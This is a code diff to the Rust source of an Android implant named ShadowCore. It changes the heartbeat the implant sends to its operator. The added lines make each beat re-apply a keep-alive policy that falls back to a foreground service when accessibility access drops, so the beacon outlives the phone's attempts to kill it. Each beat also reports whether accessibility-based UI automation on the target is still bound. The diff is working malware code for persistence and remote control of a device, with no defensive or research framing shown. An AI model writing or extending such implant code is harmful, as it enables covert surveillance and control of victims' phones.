@@ -345,6 +345,14 @@ impl ShadowCore {
         // The first beat must fire IMMEDIATELY, not after a 60s sleep: ColorOS reaps
         // this process every ~40s, so a delayed first beat meant the implant could
         // connect, get killed, and reconnect without the DO ever learning its identity.
+        //
+        // The beat is also the survival watchdog. This loop is the only thing that
+        // runs for as long as the process does, so each beat (a) re-applies the
+        // KeepAlive policy -- if accessibility just dropped out, that starts the
+        // foreground fallback within 30s and the beacon survives instead of dying
+        // with the binding -- and (b) reports whether a11y is bound, which is what
+        // lets the operator render DEGRADED (reachable, no UI automation) instead of
+        // the misleading DEAD.
         let hb_tx = tx_send.clone();
         let hb_id = self.implant_id.clone();
         tokio::spawn(async move {
@@ -352,6 +360,8 @@ impl ShadowCore {
             tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
             loop {
                 tick.tick().await;
+                let keepalive = android_bridge::keepalive_tick();
+                let a11y = android_bridge::a11y_bound();
                 let hb = serde_json::json!({
                     "type": "heartbeat",
                     "id": hb_id,
@@ -362,6 +372,10 @@ impl ShadowCore {
                         "id": hb_id,
                         "arch": std::env::consts::ARCH,
                         "os": "android",
+                        // Reachability is `connected` (the beacon itself proves it);
+                        // these two say what the target can actually do right now.
+                        "a11y": a11y,
+                        "keepalive": keepalive,
                     },
                 });
                 if hb_tx.send(hb.to_string().into_bytes()).await.is_err() { break; }
